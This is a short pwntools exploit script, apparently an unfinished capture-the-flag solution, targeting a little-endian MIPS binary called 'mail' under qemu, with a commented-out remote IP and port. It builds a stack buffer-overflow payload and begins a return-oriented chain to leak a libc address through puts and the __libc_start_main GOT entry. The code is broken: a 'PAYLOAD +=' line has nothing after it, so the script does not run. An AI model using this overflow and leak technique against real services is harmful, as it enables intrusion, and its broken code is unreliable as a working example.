from pwn import *

context.arch = 'mips'
context.endian = 'little'

e = ELF('./mail')
rop = ROP(e)

#r = remote('122.38.251.9', 57575)
r = process(['qemu-mipsel-static', '-L', '/usr/mipsel-linux-gnu/', '-g', '8888', './mail'])
libc = ELF('./libc-2.27.so')

PUTS_PLT = 0x400EA0
LIBC_START_MAIN_PLT = 0x400EB0
LIBC_START_MAIN_GOT = 0x4120B8

PAYLOAD = b'\x41' * 260 + b'\x42' * 4

# puts(LIBC_START_MAIN_GOT)
PAYLOAD += 


r.sendafter(b'[+] To : ', PAYLOAD)